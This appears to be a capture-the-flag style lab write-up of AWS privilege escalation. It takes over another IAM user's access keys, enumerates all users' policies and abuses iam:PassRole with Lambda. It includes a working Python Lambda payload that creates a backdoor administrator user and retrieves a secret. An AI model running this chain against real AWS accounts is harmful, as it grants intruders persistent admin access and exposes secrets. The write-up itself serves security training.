# AWS Privilege Escalation Lab Writeup: From IAM Enumeration to Lambda Admin Exploitation

Objective: Elevate privileges from a low-privileged IAM user to an Administrator using misconfigured policies, iam:PassRole, and AWS Lambda.

Tools used: AWS CLI, Bash script, Python, AWS Lambda, AWS Secrets Manager.

## Phase 1: Initial Reconnaissance & Enumeration
We start by verifying our initial identity using the mapper profile:

```
aws sts get-caller-identity --profile mapper
```

```JSON
{
    "UserId": "AIDAQ7H5VOHZ3DY5PR4CT",
    "Account": "067103977971",
    "Arn": "arn:aws:iam::067103977971:user/cg-pentest-lab"
}
```
Next, we check the attached policies for this user:

```
aws iam list-attached-user-policies --user-name cg-pentest-lab --profile mapper
```
The user has IAMReadOnlyAccess, which grants broad permissions (iam:Get*, iam:List*) across the AWS account.

We also discover an inline policy named cg-pentest-create-access-key-lab:

```JSON
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Action": "iam:CreateAccessKey",
            "Effect": "Allow",
            "Resource": "arn:aws:iam::*:user/*"
        }
    ]
}
```

## Phase 2: Enumerating Users and Finding the Target
Since there are too many users in the account to check manually, we use a Bash loop to enumerate all users and their respective inline/attached policies:

```Bash
for user in $(aws iam list-users --query 'Users[*].UserName' --output text --profile mapper); do
  echo "=== User: $user ==="
  aws iam list-attached-user-policies --user-name "$user" --query 'AttachedPolicies[*].PolicyName' --output text --profile mapper
  aws iam list-user-policies --user-name "$user" --output text --profile mapper
done
```
Discovery:

User cg-jussmaes-lab contains a unique inline policy: cg-lambda-developer-policy-lab.

We generate access keys for cg-jussmaes-lab using our initial permissions (iam:CreateAccessKey) and configure a new profile (mapper2).
```
 aws iam create-access-key --user-name cg-jussmaes-lab --profile mapper  
```

## Phase 3: Analyzing the Lambda Privilege Escalation Vector
Inspecting the inline policy of cg-jussmaes-lab (with mapper profile and not mapper2, mapper2 have no iam rights) reveals a classic privilege escalation misconfiguration:

```
aws iam get-user-policy --user-name cg-jussmaes-lab --policy-name cg-lambda-developer-policy-lab --profile mapper
```

```JSON
{
    "PolicyDocument": {
        "Statement": [
            {
                "Action": [
                    "lambda:CreateFunction",
                    "lambda:InvokeFunction"
                ],
                "Effect": "Allow",
                "Resource": "*"
            },
            {
                "Action": "iam:PassRole",
                "Effect": "Allow",
                "Resource": "arn:aws:iam::067103977971:role/cg-LambdaAdminExecutionRole-lab"
            }
        ]
    }
}
```
Understanding the Vulnerability:
lambda:CreateFunction & lambda:InvokeFunction: Allows us to deploy and execute arbitrary serverless functions.
iam:PassRole: Allows us to pass a very specific high-privileged role (cg-LambdaAdminExecutionRole-lab) to our newly created Lambda function.

Auditing the target execution role (cg-LambdaAdminExecutionRole-lab) reveals it has the AdministratorAccess managed policy attached:

```
aws iam list-attached-role-policies --role-name cg-LambdaAdminExecutionRole-lab --profile mapper
```
```
AdministratorAccess (arn:aws:iam::aws:policy/AdministratorAccess).
```
## Phase 4: Exploitation via AWS Lambda
To leverage the administrative execution role, we write a Python script that creates an administrator user (named pwned-admin) and generates an access key for it.

1. Payload (lambda_function.py)
```Python
import boto3

def handler(event, context):
    client = boto3.client('iam')
    try:
        client.create_user(UserName='pwned-admin')
        client.attach_user_policy(
            UserName='pwned-admin',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        response = client.create_access_key(UserName='pwned-admin')
        return {
            'statusCode': 200,
            'body': response
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': str(e)
        }
```
2. Deployment and Execution
We zip the payload, create the function with the administrative execution role, and invoke it using the mapper2 profile:

```
zip function.zip lambda_function.py
```
```
aws lambda create-function \
    --function-name elevate-priv \
    --runtime python3.9 \
    --role arn:aws:iam::067103977971:role/cg-LambdaAdminExecutionRole-lab \
    --handler lambda_function.handler \
    --zip-file fileb://function.zip \
    --profile mapper2
```
```
aws lambda invoke --function-name elevate-priv output.json --profile mapper2
```
(Note: The invocation returns a JSON serialization error regarding datetime objects, but the execution succeeds on the backend.)

Phase 5: Verification & Flag Retrieval
We verify that the backdoor user pwned-admin was successfully created, generate a fresh access key, configure a new profile (mapperA), and confirm administrative privileges:

```
aws iam create-access-key --user-name pwned-admin --profile mapper
aws sts get-caller-identity --profile mapperA
```

```JSON
{
    "UserId": "AIDAQ7H5VOHZYDIN4CDJI",
    "Account": "067103977971",
    "Arn": "arn:aws:iam::067103977971:user/pwned-admin"
}
```
Finally, we query AWS Secrets Manager to capture the administrative flag:

```
aws secretsmanager list-secrets --profile mapperA
```
```
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:067103977971:secret:cg-admin-flag-lab-ng6ifU --profile mapperA
```
Result: Successfully retrieved the flag:
HSM{44..................a9}
